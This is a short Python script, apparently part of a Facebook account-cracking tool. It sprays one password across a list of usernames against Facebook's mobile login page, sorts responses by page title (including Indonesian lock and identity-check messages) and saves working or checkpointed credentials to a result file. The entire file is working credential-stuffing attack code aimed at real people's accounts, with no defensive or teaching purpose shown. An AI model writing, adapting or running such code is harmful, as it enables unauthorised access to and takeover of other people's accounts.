from bs4 import BeautifulSoup as parser

def crackers(username, password, cookie):
	try:
		a = 0
		for user in username:
			a+=1
			data = {'email': user,
				'pass': password,
				'submit': 'login'
				}
			start = parser(requests.post('https://mbasic.facebook.com/login/?ref=dbl&fl', data=data,
				headers={'Cookie': cookie}).text, 'html.parser').title.text
			print(f'\r[•] Cracking [{a}|{len(username)}]', end='', flush=True)
			if 'Facebook' in str(start):
				f = open('lib/result.txt','w')
				f.write(f'ok > {user}|{password}\n')
				return True
			elif 'Akun Anda Dikunci Untuk Sementara Waktu' in str(start) or 'Konfirmasikan Identitas Anda' in str(start):
				f = open('lib/result.txt','w')
				f.write(f'cp > {user}|{password}\n')
				return True
		if len(open('lib/result.txt').read().splitlines()) == 0:
			os.remove('lib/result.txt')
			exit('[•] No Result')
		else:
			print('\nresult saved on lib/result.txt')
	except requests.exceptions.ConnectionError: pass
